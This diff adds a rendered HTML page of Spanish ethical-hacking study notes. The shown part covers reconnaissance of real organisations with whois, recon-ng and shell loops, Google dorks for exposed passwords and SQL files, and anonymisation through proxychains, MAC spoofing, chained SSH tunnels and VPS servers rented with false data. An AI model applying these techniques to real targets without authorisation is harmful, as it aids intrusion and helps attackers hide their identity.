+  <a href="#eliminar-rastros-y-sistemas-de-seguridad" class="md-nav__link">
+    Eliminar rastros y sistemas de seguridad
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#espionaje" class="md-nav__link">
+    Espionaje
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#snifer" class="md-nav__link">
+    Snifer
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#backdoor" class="md-nav__link">
+    Backdoor
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pivoting" class="md-nav__link">
+    Pivoting
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#conectar-de-windows-a-windows" class="md-nav__link">
+    Conectar de windows a windows
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#de-shell-a-meterpreter" class="md-nav__link">
+    De shell a meterpreter
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#extraer-credenciales" class="md-nav__link">
+    Extraer credenciales
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ophcrack" class="md-nav__link">
+    Ophcrack
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#procdump" class="md-nav__link">
+    Procdump
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#unshadowjohn" class="md-nav__link">
+    unshadow/john
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fuerza-bruta" class="md-nav__link">
+    Fuerza bruta
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#evadir-antivirus" class="md-nav__link">
+    Evadir antivirus
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#veil-evasion" class="md-nav__link">
+    veil-evasion
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellter" class="md-nav__link">
+    shellter
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#evadir-autenticacion" class="md-nav__link">
+    Evadir autenticación
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerabilidades-en-aplicaciones-web" class="md-nav__link">
+    vulnerabilidades en aplicaciones web
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#metodologia_1" class="md-nav__link">
+    Metodología
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ataques-conocidos" class="md-nav__link">
+    Ataques conocidos
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#herramientas" class="md-nav__link">
+    Herramientas
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    xss
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#evasion-de-filtros" class="md-nav__link">
+    Evasión de filtros
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql-injection" class="md-nav__link">
+    sql injection
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sqlmap" class="md-nav__link">
+    sqlmap
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerabilidades-en-red" class="md-nav__link">
+    vulnerabilidades en red
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analisis-de-trafico" class="md-nav__link">
+    Análisis de trafico
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#intercepcion-de-trafico-man-in-the-midle" class="md-nav__link">
+    intercepción de trafico (man in the midle)
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#dhcp-falso" class="md-nav__link">
+    dhcp falso
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vulnerabilidades-wifi" class="md-nav__link">
+    vulnerabilidades wifi
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/jorgepastorr/apuntes/edit/master/docs/auditoria/apuntes_hacking.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                <h1 id="haking-etico">Haking ético</h1>
+<h2 id="nociones-basicas">Nociones básicas</h2>
+<h3 id="ambitos-de-la-seguridad">Ámbitos de la seguridad</h3>
+<p>Ámbito físico</p>
+<p>identificar medidas de seguridad, accesos alternativos, evasion de control de acceso RFIC/NFC ( targeta de acceso ), evasión control biometrico, wireles, wifi.</p>
+<p>Ámbito Digital</p>
+<p>anonimacion de las comunicaciones, analisis servicios públicos, dominios internos,  todo lo relacionado al software.</p>
+<p>Ámbito humano</p>
+<p>el objetivo de este ábito es engañar al usuario mediante, vishing ( llamadas telefonicas ), usb cebo, mails con malware , suplantación de identidad, ingenieria social etc...</p>
+<h3 id="pruebas-acotadas-dentro-de-hacking-etico">Pruebas acotadas dentro de Hacking Ético</h3>
+<ul>
+<li><strong>Ejercicios Read Team.</strong></li>
+<li>Simulación de un ataque real donde la empresa desconoce las acciones que van a ser realizadas, cuando y por quien.</li>
+<li><strong>Test de Intrusión.</strong></li>
+<li>Pruebas de intrusión con un alcance limitado, donde existe colaboración entre auditor  y empresa.</li>
+<li>En este caso el ámbito de actuación esta definido, la organización conoce de parte de los detalles que se ejecutaran y se verifican vulnerabilidades y se explotan de manera limitada.</li>
+<li><strong>Auditoría de Vulnerabilidades</strong></li>
+<li>Identificación de vulnerabilidades conocidas.</li>
+<li>Suele estar dirigido a los servicios que especifica la empresa y únicamente se identifican las vulnerabilidades de dichos servicios.</li>
+</ul>
+<h3 id="tipos-de-enfoques">Tipos de enfoques</h3>
+<p><strong>Caja Negra:</strong>  </p>
+<p>El desconocimiento completo de cualquier información referente al activo a auditar. Este tipo de enfoque es el mas real ya que se simula un atacante real ya que desconoce todos los servicios.</p>
+<p><strong>Caja Negra con Post-Autentificación:</strong>  </p>
+<p>Únicamente se tienen las credenciales de acceso. Este tipo de enfoque se realiza para prevenir vulnerabilidades de método interno o en lugares que se permite acceder a una red publica etc...</p>
+<p><strong>Caja gris:</strong>  </p>
+<p>Conocimiento parcial del activo a auditar.</p>
+<p><strong>Caja blanca:</strong>   </p>
+<p>Conocimiento completo del activo. Este método al tener el conocimiento total del activo se pueden identificar el total de las vulnerabilidades de los servicios del activo.</p>
+<h3 id="vectores-de-ataque">Vectores de ataque</h3>
+<p><strong>Ataque dirigido.</strong>  </p>
+<p>los ataques dirigidos consiste en un ataque a un objetivo en concreto, se suelen seguir los siguientes pasos.</p>
+<ul>
+<li>Reconocimiento: de información de la empresa o victima a atacar, consiste en identificar todos los posibles accesos.</li>
+<li>vector de acceso:  localizar el acceso más vulnerable y acceder a el mismo.</li>
+<li>persistencia: una vez dentro asegurarse de que si cierran un método de entrada puedas acceder por otro, infectando múltiples dispositivos.</li>
+<li>movimiento lateral: poder acceder a diferentes redes de la victima y asegurar un libre acceso entre ellas.</li>
+<li>acceso a los datos: Tener acceso y control de los datos de la victima.</li>
+<li>Extracción: extraer los datos.</li>
+</ul>
+<p><strong>Ataque no dirigido</strong>  </p>
+<p>Los ataques no dirigidos se lanzan a multitud de dispositivos sin saber su destino.</p>
+<ul>
+<li>
+<p><code>malware</code>: infectar un dispositivo  insertando algún tipo de programa malicioso.</p>
+</li>
+<li>
+<p><code>phishing</code> : suplantar la identidad e bancos, policía para extraer datos del usuario</p>
+</li>
+<li>
+<p><code>explotación masiva</code>: infectar mayor número de dispositivos posibles para en un futuro tener el control y hacer un ataque masivo.</p>
+</li>
+</ul>
+<h3 id="dispositivos-de-seguridad">Dispositivos de seguridad</h3>
+<p><strong>Firewall ( cortafuegos )</strong>  </p>
+<p>Es un software o hardware que es capaz de filtrar el trafico entrante y saliente de la red para prevenir el acceso no deseado a las redes protegidas.</p>
+<p><strong>red desmilitarizada (DMZ)</strong>  </p>
+<p>Es una red aislada intermedia entre internet y la red interna de la organización.</p>
+<p>En este tipo de redes tenemos un primer firewall desde el router a los servidores públicos y un segundo firewall para la red interna, de esta manera desde el exterior se podra acceder a los servidores públicos y la red interna seguira protegida.</p>
+<p><strong>Honeypot</strong>  </p>
+<p>Es un dispositivo que simula los servicios o dispositivos de nuestra red. esto sirve para que el atacante pierda tiempo intentando manipular estos dispositivos ya que se muestran mas vulnerables y a la vez nos avisa que alguien esta dentro de nuestra red.</p>
+<p><strong>Sistema de detección de intrusos (IDS)</strong>   </p>
+<p><strong>NIDS:</strong></p>
+<ul>
+<li>intenta identificar comportamientos anómalos en la red</li>
+</ul>
+<p><strong>HIDS:</strong></p>
+<ul>
+<li>intenta identificar comportamientos anómalos en los hosts</li>
+</ul>
+<p><strong>Firewall de aplicación web (WAF)</strong>  </p>
+<p>es un sistema que se pone delante de una aplicación web e intenta identificar  si se esta ejecutando algún  tipo de ataque y lo corta.</p>
+<h2 id="laboratorio-de-pruebas">Laboratorio de pruebas</h2>
+<p>metasploitable I, II y III: distribuciones diseñadas para aprender a vulnerar sistemas y servicios.</p>
+<p>https://www.vulnhub.com/entry/metasploitable-1,28/</p>
+<p>https://www.vulnhub.com/entry/metasploitable-2,29/</p>
+<p>Web for pentester I y II: vulnerar aplicaciones webmediante la especificación de diferentes tecnicas y la necesidad de evadir filtros.</p>
+<p>https://download.vulnhub.com/dvwa/</p>
+<p>Owasp broken web applications project: maquina virtual que desplega una gran cantidad de servicios web vulnerables.</p>
+<p>https://sourceforge.net/projects/owaspbwa/files/</p>
+<p>Existen aplicacciones web que se encargan de recopilar maquinas vulnerables. www.vulnhub.com </p>
+<h2 id="introduccion-kali">Introducción Kali</h2>
+<p>escanear pagina de cisco, extraer ip's de dominios</p>
+<div class="codehilite"><pre><span></span><code>wget https://www.cisco.com 
+grep <span class="s2">&quot;href=&quot;</span> index.html <span class="p">|</span> cut -d<span class="s2">&quot;/&quot;</span> -f3 <span class="p">|</span> grep <span class="s2">&quot;\.&quot;</span> <span class="p">|</span> cut -d<span class="s1">&#39;&quot;&#39;</span> -f1 <span class="p">|</span> sort -u &gt; dominios.txt
+<span class="k">for</span> dom in <span class="k">$(</span>cat dominios.txt<span class="k">)</span><span class="p">;</span><span class="k">do</span> host <span class="nv">$dom</span> <span class="p">|</span> grep <span class="s2">&quot;has address&quot;</span> <span class="p">|</span> cut -d<span class="s2">&quot; &quot;</span> -f4 <span class="p">;</span> <span class="k">done</span> <span class="p">|</span> sort -u &gt; ips_cisco.txt
+</code></pre></div>
+
+<h2 id="anonimato">Anonimato</h2>
+<h3 id="tunelizacion-de-protocolos">Tunelización de protocolos</h3>
+<p>consiste en  de encapsular un protocolo dentro de otro creando un túnel. Es utilizado para transformar un protocolo determinado que comúnmente no se permite en una red.</p>
+<p>para que este proceso sea efectivo tanto cliente como servidor deben establecer los parámetros de tunelización y protocolos que van a utilizar.</p>
+<p>un ejemplo sería camuflar trafico SSH a través del trafico HTTP, se utilizaría el tunel del HTTP para enviar trafico SSH.</p>
+<h3 id="servidores-proxy">Servidores proxy</h3>
+<p>Un servidor proxy funciona como punto intermedio entre el cliente y el servidor redireccionando las peticiones y respuestas de forma transparente entre ambas. Esto permite ocultar la dirección IP real del cliente, ya que el servidor vería unicamente la dirección IP del proxy.</p>
+<p>Si a esto le sumas un encadenamiento de proxys en diferentes paises o continentes, el trabajo para descubrir la IP origen es mas tedioso.</p>
+<h3 id="virtual-private-network-vpn">Virtual Private Network (VPN)</h3>
+<p>Es una tecnología que permite crear conexiones privadas entre dos puntos utilizando una red publica como internet.</p>
+<p>El funcionamiento es que estableces una conexión segura con el servidor VPN y desde allí sales a internet. Podemos encontrar servicios VPN tanto de pago como gratuitos distribuidos por distintos paises.</p>
+<p>muy utilizado para evitar intercepciones de 5rafico, conexiones seguras en sitios publicos y anonimizar conexiones.</p>
+<h3 id="redes-de-anonimacion">Redes de anonimación</h3>
+<p>TOR</p>
+<p>Es la red anónima mas conocida a día de hoy. Consiste en una red completamente centralizada que aporta anonimato en la navegación por internet, así como acceso a la red de TOR.</p>
+<p>Este funciona conectandose a traves de varias capas de cifrado en la red de tor, pasando por varios nodos de dicha red y finalmente salir de la red de tor a la red comun sin cifrar pero sin la posibilidad de saber quien eres. A no ser que en dicho mensaje hayan datos personales, por eso mismo no se deve acceder a sitios con identificación como email, dni, etc...</p>
+<p>FREENET/I2P</p>
+<p>Estas dos opciones son muy similares y lo que permiten es tener acceso a la red oculta dentro de internet denominada como <em>Dark Net</em> o <em>Deep Web</em> , esta red tiene la peculiardad de ser una red descentralizada.</p>
+<h3 id="proxy">Proxy</h3>
+<p><strong>Proxychain</strong> </p>
+<p>Es un proxy para enrutar programas, comandos desde el terminal, su configuración es muy sencilla igual que su modo de uso.</p>
+<p>Su configuración se encuentra en  <code>/etc/proxychain.conf</code>  </p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># modo vervose</span>
+<span class="c1">#quiet_mode</span>
+<span class="c1"># pasar dns por proxy (recomendado)</span>
+proxy_dns
+</code></pre></div>
+
+<p>al final del todo, puedes poner tantos como quieras, por defecto viene configurado tor, pero lo puedes quitar o añadir debajo los proxys que quieres que valla recorriendo.</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># tipo de conexion   ip              puerto     user    pasword</span>
+<span class="c1"># defaults set to &quot;tor&quot;</span>
+<span class="c1">#socks4             127.0.0.1        9050</span>
+socks4               <span class="m">88</span>.78.73.116    <span class="m">1080</span>
+</code></pre></div>
+
+<p>Utilizar proxychains con wget.  canihazip es una web que nos dice que ip publica tenemos, utilizando proxychains mostrara que tenemos la ip publica <code>88.78.73.116</code> </p>
+<div class="codehilite"><pre><span></span><code>proxychains wget http://canihazip.com/s
+</code></pre></div>
+
+<p><strong>Foxyproxy</strong>  </p>
+<p>Un plugin del navegador donde puedes configurar tus proxy y cambiar entre ellos rápidamente.</p>
+<h3 id="vpn">VPN</h3>
+<p>Con una VPN creas un túnel seguro hasta el servidor de la VPN y sale tu conexión de allí a la red. existen VPN gratuitas o opensource como <code>openvpn</code> o de pago .</p>
+<p><strong>Vpn de pago:</strong>  </p>
+<p>Estos servicios de pago normalmente tienen un software de instalación para su utilización sencilla. Además te permite conectar a través de diferentes países ya que tienen servidores distribuidos por los diferentes continentes.</p>
+<ul>
+<li>
+<p><code>ExpressVPN</code> - Caribe</p>
+</li>
+<li>
+<p><code>NordVPN</code> - Panama</p>
+</li>
+<li>
+<p><code>TorGuard</code> - Antillas</p>
+</li>
+<li>
+<p><code>IPredator</code> - Chipre</p>
+</li>
+<li>
+<p><code>PureVPN</code> - Hong kong</p>
+</li>
+</ul>
+<h3 id="cambiar-mac">Cambiar Mac</h3>
+<p>En ocasiones es útil cambiar la mac de un ordenador para burlar listas blancas etc...</p>
+<p><strong>windows</strong></p>
+<p>administrador de dispositivos</p>
+<p>adaptadores de red</p>
+<p>opciones avanzadas</p>
+<p>dirección administrada localmente --&gt; valor</p>
+<p><strong>linux</strong> </p>
+<div class="codehilite"><pre><span></span><code>ifconfig eth0 down
+macchanger -m <span class="m">00</span>:11:22:33:44:55 eth0
+ifconfig eth0 up
+<span class="c1"># cambio random</span>
+macchanger -r
+<span class="c1"># cambio permanente</span>
+macchanger -p
+</code></pre></div>
+
+<h3 id="creando-plataforma-anonima">Creando plataforma anónima</h3>
+<p>Para crear una plataforma anónima ("legalmente") se han de seguir diferentes pasos.</p>
+<ul>
+<li>Contratación anónima de servidores VPS distribuidos en diferentes lugares ( comprarlos o alquilarlos con bitcoins y datos falsos ).</li>
+<li>Enlazar los servidores con túneles para un manejo fluido a la hora de ejecutar operaciones.</li>
+</ul>
+<h4 id="creando-tuneles">Creando túneles</h4>
+<p>Activar ssh en todos los vps</p>
+<div class="codehilite"><pre><span></span><code>host1  <span class="m">192</span>.168.122.1
+host2  <span class="m">192</span>.168.122.2
+host3  <span class="m">192</span>.168.122.3
+</code></pre></div>
+
+<h5 id="tunel-estatico">Túnel Estático</h5>
+<p>Un túnel estático redirige las peticiones de un puerto local a otro host remoto en el puerto indicado.</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># desde host2 </span>
+ <span class="c1"># se conecta a host3 y se deja el tunel abierto</span>
+ssh -L <span class="m">1234</span>:192.168.122.3:22 root@192.168.122.3
+
+<span class="c1"># desde otra terminal de host2</span>
+ssh root@127.0.0.1 -p <span class="m">1234</span>
+root@host3:~<span class="nv">$_</span>
+</code></pre></div>
+
+<p>Esta opción <code>1234:192.168.122.3:22</code> ejecutada desde host2 esta diciendo, abre el puerto 1234 en host2 y todo lo que entre por ahí, lo rediriges a host3 en el puerto 22. Por eso al hacer el ssh en al puerto 1234 en  host2 conectas a host3.</p>
+<h5 id="tunel-dinamico">Túnel dinámico</h5>
+<p>Un túnel dinámico redirige las peticiones de un puerto local a otro host remoto sin importar el puerto destino.</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># desde host2</span>
+<span class="c1"># establezco tunel dinamico desde host2 a host3</span>
+ssh -D <span class="m">1234</span> root@192.168.122.3 
+<span class="c1"># host2 tiene abierto el puerto 1234 y redirige a host3 </span>
+
+<span class="c1"># desde otra terminal en host2 configuro proxychains para conectar con el puerto que acabo de abrir.</span>
+cp /etc/proxychains.cong ./
+vim proxychains.conf
+<span class="c1"># ultima linea</span>
+<span class="m">127</span>.0.0.1   <span class="m">1234</span>
+
+<span class="c1"># ahora todo lo que se ejecute con proxychains se reenviara a host3</span>
+root@host2~$ proxychains ssh root@127.0.0.1
+root@host3~<span class="nv">$_</span>
+</code></pre></div>
+
+<blockquote>
+<p>Esto al ser solo un salto entre host no tiene mucho sentido ya que arias un ssh simple y ya. todo cobra sentido al añadir mas hosts en la ecuación.</p>
+</blockquote>
+<h5 id="secuencia-de-tuneles">Secuencia de Túneles</h5>
+<p>En este caso crearemos una mezcla de túneles dinámicos y estáticos, el host final con el penúltimo tendrán un túnel dinámico para poder lanzar cualquier tipo de petición, todos los demás host de la cola se conectaran mediante túneles estáticos para saber por que puerto seguir dicha cola.</p>
+<p>Utilizaremos 3 host porque poner mas es repetir lo mismo una y otra vez, host3 sera el host final, conectara el host2 con el host3 mediante un túnel dinámico y luego el host1 conectara con host2 mediante un túnel estático. De esta manera los comandos ejecutados desde el host1 saldrán por el host3.</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># desde host2</span>
+<span class="c1"># establezco tunel dinamico desde host2 a host3</span>
+ssh -D <span class="m">1234</span> root@192.168.122.3 
+<span class="c1"># host2 tiene abierto el puerto 1234 y redirige a host3 </span>
+
+<span class="c1"># desde otra terminal en host2 configuro proxychains para conectar con el puerto que acabo de abrir.</span>
+cp /etc/proxychains.cong ./
+vim proxychains.conf
+<span class="c1"># ultima linea</span>
+<span class="m">127</span>.0.0.1   <span class="m">1234</span>
+
+<span class="c1"># desde host1</span>
+cp /etc/proxychains.cong ./
+vim proxychains.conf
+<span class="c1"># ultima linea</span>
+<span class="m">127</span>.0.0.1   <span class="m">4321</span>
+
+<span class="c1">#  crear túnel estático y dejar abierto</span>
+ssh -L <span class="m">4321</span>:127.0.0.1:1234 root@192.168.122.2 
+
+
+<span class="c1"># ----- comprobar que funciona -----------------------</span>
+<span class="c1"># desde otro terminal de host1 abro un puerto</span>
+nc -lvvp <span class="m">6666</span>
+
+<span class="c1"># desde otro terminal host1</span>
+proxychains  nc <span class="m">192</span>.168.122.1 <span class="m">6666</span>
+conexion a <span class="m">192</span>.168.122.1 desde <span class="m">192</span>.168.122.3
+
+<span class="c1"># desde host1 conectar con host final</span>
+proxychains ssh root@127.0.0.1
+root@host3~<span class="nv">$_</span>
+</code></pre></div>
+
+<blockquote>
+<p>para añadir mas nodos solo se tendría que repetir las acciones echas en el host1 cambiando los puertos correspondientes y la ip del nodo a seguir.</p>
+</blockquote>
+<h2 id="identificacion-y-explotacion-de-vulnerabilidades-en-sistemas">Identificación y explotación de vulnerabilidades en sistemas</h2>
+<h3 id="metodologia">Metodología</h3>
+<p>Para lograr auditar y vulnerar un sistema es necesario seguir una serie de pautas.</p>
+<ol>
+<li>Obtención de datos:  recolectar la máxima información de los dispositivos de una organización, así como servicios públicos, etc...</li>
+<li>Enumeración de sistemas: enumerar y organizar que sistemas o redes tiene dicha  organización y versiones de dichos sistemas o servicios.</li>
+<li>Análisis de vulnerabilidades: identificar las vulnerabilidades conocidas para cada sistema o servicio de la organización.</li>
+<li>Explotación de vulnerabilidades:  intentar acceder al dispositivo a través de alguna vulnerabilidad.</li>
+<li>Post-extracción de vulnerabilidades: una vez dentro del sistema exportar datos sensibles, pivotar entre redes, asegurar conexiones futuras, etc...</li>
+<li>Documentación.</li>
+</ol>
+<h3 id="obtencion-de-datos">Obtención de datos</h3>
+<p>Para la primera identificación de datos se puede utilizar el comando <code>whois</code> o  una aplicación web similar a <code>whois.domaintools.com</code>  de esta manera podremos extraer datos como: dns, números de teléfono, localización y algún dato útil mas.</p>
+<div class="codehilite"><pre><span></span><code>whois gencat.cat
+...
+Registrant Name: Generalitat de Catalunya
+Registrant Organization: Generalitat de Catalunya
+Registrant Street: Via Laietana, <span class="m">14</span>
+Registrant City: Barcelona
+Registrant State/Province:
+Registrant Postal Code: <span class="m">08003</span>
+Registrant Country: ES
+Registrant Phone: +34.935676330
+Registrant Email: dominis.ctti@gencat.cat
+...
+Name Server: a16-65.akam.net
+Name Server: a1-133.akam.net
+Name Server: a11-64.akam.net
+....
+</code></pre></div>
+
+<blockquote>
+<p>Es importante hacer la resolución de dominio para obtener la ip y volver a buscar con <code>whois</code> mas información.</p>
+</blockquote>
+<h4 id="recoleccion-de-datos">Recolección de datos</h4>
+<p>Para empezar a auditar una organización necesitamos obtener todos los sistemas autónomos a los que pertenece si es que los tiene, para después extraer todos los rangos de ip publicas en las que se aloja, para extraer todos los dominios y subdominios que pertenece a dicha organización.</p>
+<p>Esta labor es lenta y bastante pesada ya que hay que estar atento a los detalles y en según que organización la cantidad de datos extraídos será muy alta.</p>
+<h5 id="analisis-de-direcciones-ip">Análisis de direcciones ip</h5>
+<p>Para la extracción de direcciones ip existen aplicaciones como www.robtex.com  que nos facilitara el trabajo.</p>
+<p>Esta aplicación mediante un dominio o una dirección ip extrae una buena información como dns, subdominios, etc...</p>
+<h6 id="curiosidad">Curiosidad</h6>
+<p>Se puede utilizar robtex para evitar los filtros que tienen algunas webs como mailinator o guerrillamail.</p>
+<p>Estas dos opciones son de correo basura temporal, lo primero que tenemos que hacer es añadir el dominio de <code>guerrillamail.com</code> a robtex.</p>
+<p>En el apartado <code>shared</code>  buscar <code>using as mail server</code> o <code>partially sharing ip numbers</code>.</p>
+<ul>
+<li>Este apartado devuelve los dominios y subdominios que apuntan a la ip del dominio principal.</li>
+</ul>
+<p>Por ultimo al enviar un email cambiar el dominio que nos a dado la web de guerrilla en el email, normalmente <code>@sharklasers.com</code> por el que hemos extraído de robtex.</p>
+<h5 id="analisis-de-sistemas-autonomos">Análisis de sistemas autónomos</h5>
+<p>Un <strong>Sistema Autónomo</strong> (en <a href="https://es.wikipedia.org/wiki/Idioma_inglés">inglés</a>, <em>Autonomous System</em>: <strong>AS</strong>) se define como “un grupo de redes <a href="https://es.wikipedia.org/wiki/Protocolo_IP">IP</a>
+que poseen una política de rutas propia e independiente”. Esta definición hace referencia a la característica fundamental de un Sistema Autónomo: realiza su propia gestión del tráfico que fluye entre él y 
+los restantes Sistemas Autónomos que forman Internet. Un número de AS o  ASN se asigna a cada AS, el que lo identifica de manera única a sus  redes dentro de internet.</p>
+<p>Esto lo utilizan las organizaciones para tener mayor velocidad entre todos sus dominios y subdominios.</p>
+<p>Para la extracción y analisis de sistemas autónomos se pueden utilizar aplicaciones como  www.ipv4info.com o <a href="https://bgp.he.net/">bgphurricane</a></p>
+<p>Se puede buscar por dominio, ip , nombre sistema autónomo o nombre de la compañía.</p>
+<p>De esta manera extraeremos todos los sistemas autónomos de la organización, sus rangos de ip públicos y sus dominios.</p>
+<h5 id="analisis-de-dominios-y-subdominios">Análisis de dominios y subdominios</h5>
+<p>Una buena aplicación para extraer subdominios es www.dnsdumpster.com , en ella le insertaremos el dominio a buscar y extraerá sus subdominios junto a sus ip correspondientes.</p>
+<h4 id="browser-hacking">Browser Hacking</h4>
+<p>Operadores de búsqueda  </p>
+<div class="codehilite"><pre><span></span><code><span class="n">site</span><span class="o">:</span><span class="n">udemy</span><span class="o">.</span><span class="na">com</span>  <span class="err">#</span> <span class="n">datos</span> <span class="n">en</span> <span class="n">udemy</span>
+<span class="o">-</span>   <span class="err">#</span> <span class="n">negacion</span>
+<span class="err">#</span><span class="mi">10</span><span class="o">..</span><span class="mi">19</span><span class="err">#</span>    <span class="err">#</span> <span class="n">rango</span> 
+<span class="n">intitle</span><span class="o">:</span><span class="s2">&quot;index of /&quot;</span>    <span class="err">#</span> <span class="n">buscar</span> <span class="n">en</span> <span class="n">titulo</span>
+<span class="n">allintitle</span><span class="o">:</span><span class="s2">&quot;index of /&quot;</span> <span class="err">#</span> <span class="n">busca</span> <span class="n">en</span> <span class="n">titulo</span> <span class="n">exactamente</span> <span class="s2">&quot;index of /&quot;</span>
+<span class="n">inurl</span><span class="o">:</span><span class="s2">&quot;admin.php&quot;</span>   <span class="err">#</span> <span class="n">buscar</span> <span class="n">en</span> <span class="n">la</span> <span class="n">url</span>
+<span class="n">intext</span><span class="o">:</span><span class="s2">&quot;admin&quot;</span> <span class="n">intext</span><span class="o">:</span><span class="s2">&quot;password&quot;</span> <span class="err">#</span> <span class="n">buscar</span> <span class="n">exclusibamente</span> <span class="n">en</span> <span class="n">el</span> <span class="n">texto</span>
+<span class="n">filetype</span><span class="o">:</span><span class="n">pdf</span> <span class="err">#</span> <span class="n">ficheros</span> <span class="n">pdf</span>
+<span class="n">ext</span><span class="o">:</span><span class="n">pdf</span>     <span class="err">#</span> <span class="n">extensiones</span> <span class="n">pdf</span>
+<span class="n">inurl</span><span class="o">:</span><span class="n">admin</span> <span class="o">&amp;&amp;</span>  <span class="n">ext</span><span class="o">:</span><span class="n">sql</span>  <span class="err">#</span> <span class="n">and</span>
+<span class="o">(</span><span class="n">inurl</span><span class="o">:</span><span class="n">admin</span> <span class="n">OR</span> <span class="n">ext</span><span class="o">:</span><span class="n">sql</span> <span class="o">)</span>   <span class="err">#</span> <span class="n">or</span>
+</code></pre></div>
+
+<p><a href="https://www.exploit-db.com/google-hacking-database">google hacking database</a></p>
+<h4 id="herramienta-para-facilitar-el-analisis">Herramienta para facilitar el análisis</h4>
+<p><code>maltego</code> es una herramienta gráfica para recopilar información de una organización utiliza las aplicaciones anteriores como robtex, whois y otras para extraer toda la información.</p>
+<p>Al instalar maltego requiere la versión 8 de java para su funcionamiento, dejo una opción para su cambio rápido de versión en el sistema.</p>
+<div class="codehilite"><pre><span></span><code> sudo update-alternatives --config java
+<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> debian: 
+Existen <span class="m">2</span> opciones para la alternativa java <span class="o">(</span>que provee /usr/bin/java<span class="o">)</span>.
+
+  Selección   Ruta                                            Prioridad  Estado
+------------------------------------------------------------
+* <span class="m">0</span>            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      <span class="m">1111</span>      modo automático
+  <span class="m">1</span>            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      <span class="m">1111</span>      modo manual
+  <span class="m">2</span>            /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java   <span class="m">1081</span>      modo manual
+</code></pre></div>
+
+<p><code>recorn-ng</code> es otra aplicación de terminal para recopilar información de una organización.</p>
+<div class="codehilite"><pre><span></span><code>recorn-ng
+<span class="o">[</span>recon-ng<span class="o">][</span>default<span class="o">]</span> &gt; workspaces add udemy
+<span class="o">[</span>recon-ng<span class="o">][</span>udemy<span class="o">]</span> &gt; add domains udemy.com
+<span class="o">[</span>recon-ng<span class="o">][</span>udemy<span class="o">]</span> &gt; show modules
+<span class="o">[</span>recon-ng<span class="o">][</span>udemy<span class="o">]</span> &gt; use recon/domains-hosts/hackertarget
+<span class="o">[</span>recon-ng<span class="o">][</span>udemy<span class="o">][</span>hackertarget<span class="o">]</span> &gt; show info
+<span class="o">[</span>recon-ng<span class="o">][</span>udemy<span class="o">][</span>hackertarget<span class="o">]</span> &gt; <span class="nb">set</span> SOURCE udemy.com
+<span class="nv">SOURCE</span> <span class="o">=</span>&gt; udemy.com
+<span class="o">[</span>recon-ng<span class="o">][</span>udemy<span class="o">][</span>hackertarget<span class="o">]</span> &gt; run
+---------
+UDEMY.COM
+---------
+<span class="o">[</span>*<span class="o">]</span> <span class="o">[</span>host<span class="o">]</span> mx01.udemy.com <span class="o">(</span><span class="m">104</span>.16.91.52<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span> <span class="o">[</span>host<span class="o">]</span> web1.udemy.com <span class="o">(</span><span class="m">104</span>.16.91.52<span class="o">)</span>
